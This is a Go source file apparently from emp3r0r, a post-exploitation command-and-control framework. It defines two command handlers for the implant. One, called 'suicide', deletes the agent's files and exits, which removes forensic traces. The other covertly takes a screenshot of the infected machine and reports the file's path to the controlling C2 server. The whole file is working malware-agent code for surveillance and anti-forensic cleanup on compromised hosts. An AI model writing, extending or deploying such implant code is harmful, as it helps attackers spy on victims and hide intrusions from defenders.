package handler

import (
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"os"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
	"github.com/spf13/cobra"
)

// suicideCmdRun deletes agent files and exits.
func suicideCmdRun(cmd *cobra.Command, args []string) {
	if len(args) != 0 {
		c2transport.NotifyC2(cmd, "args error: %v", args)
		return
	}
	if err := os.RemoveAll(common.RuntimeConfig.AgentRoot); err != nil {
		c2transport.NotifyC2(cmd, "Failed to cleanup files: %v", err)
	} else {
		c2transport.NotifyC2(cmd, "Cleanup successful, exiting")
	}
	logging.Println("Exiting...")
	os.Exit(0)
}

// screenshotCmdRun takes a screenshot and returns its path.
func screenshotCmdRun(cmd *cobra.Command, args []string) {
	out, err := modules.Screenshot()
	if err != nil || out == "" {
		c2transport.NotifyC2(cmd, "Error: failed to take screenshot: %v", err)
		return
	}
	// Move file to agent's root directory.
	newPath := common.RuntimeConfig.AgentRoot + "/" + out
	if err := os.Rename(out, newPath); err != nil {
		logging.Printf("screenshot rename error: %v", err)
		c2transport.NotifyC2(cmd, "screenshot rename error: %v", err)
		return
	}
	c2transport.NotifyC2(cmd, "%s", newPath)
}
